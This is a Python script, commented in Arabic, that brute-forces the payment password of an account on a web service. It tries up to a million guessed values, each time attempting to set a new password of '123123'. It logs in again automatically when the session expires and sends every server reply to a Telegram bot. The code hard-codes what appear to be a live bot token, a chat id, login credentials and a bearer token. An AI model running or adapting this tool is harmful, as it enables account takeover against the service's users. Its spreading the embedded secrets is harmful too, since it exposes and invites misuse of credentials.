import requests
import json
import time

# بيانات تيليجرام
telegram_bot_token = "6724140823:AAE1pkFDNCAaKa1ahmXan8EJGyCNoTFTpg0"
telegram_chat_id = "1701465279"

# بيانات تسجيل الدخول
login_data = {
    'username': '1281811280',
    'password': '123456',
    'lang': 'eg',
}

# التوكن المستخدم في الطلبات
token = "02c8znoKfqx8sfRg0C0p1mQ64VVuoa7vMu+wgn1rttGH04eVulqXpX0SM9mF"

# رأس الطلبات (Headers)
headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'PythonRequests',
    'Authorization': f'Bearer {token}',
}

# دالة إعادة تسجيل الدخول
def relogin():
    global token
    try:
        response = requests.post('https://btsmoa.btswork.vip/api/User/Login', headers=headers, json=login_data)
        if response.status_code == 200:
            result = response.json()
            if "info" in result and "token" in result["info"]:
                token = result["info"]["token"]
                headers['Authorization'] = f'Bearer {token}'  # تحديث التوكن في الهيدرز
                return True
        return False
    except requests.exceptions.RequestException:
        return False

# دالة إرسال رسالة إلى تيليجرام
def send_telegram_message(password_index, response_json):
    formatted_response = json.dumps(response_json, indent=2, ensure_ascii=False)
    message = f"""
<b>𝗕𝗟𝗔𝗖𝗞 𓃠 | نتيجة التخمين 🔥</b>

🔑 <b>كلمة المرور:</b> password-{password_index}
📩 <b>رد السيرفر:</b>
<pre>{formatted_response}</pre>
"""
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    data = {"chat_id": telegram_chat_id, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=data)
    except requests.exceptions.RequestException:
        pass  # تجاهل أي أخطاء تحدث أثناء إرسال الرسالة

# دالة تجربة كلمة المرور
def try_password(password_index):
    global token

    o_payword = f"password-{password_index}"
    data = {
        'o_payword': o_payword,
        'n_payword': '123123',
        'r_payword': '123123',
        'lang': 'eg',
        'token': token,
    }

    url = "https://btsmoa.btswork.vip/api/user/setuserinfo"
    try:
        response = requests.post(url, json=data, headers=headers)
        response_json = response.json()

        # إذا انتهت الجلسة، أعد تسجيل الدخول وحاول مجددًا
        if response_json.get("code") in [203, 204]:
            if relogin():
                try_password(password_index)  # إعادة المحاولة بعد تسجيل الدخول
            return

        # إرسال النتيجة إلى تيليجرام
        send_telegram_message(password_index, response_json)

    except requests.exceptions.RequestException:
        pass  # تجاهل أي أخطاء أثناء الطلب

# بدء التخمين
def start_password_testing():
    total_passwords = 1000000  # عدد كلمات المرور
    for password_index in range(1, total_passwords + 1):
        try_password(password_index)
        time.sleep(0.1)  # انتظار بسيط لتخفيف الضغط على السيرفر

# تشغيل الكود
start_password_testing()
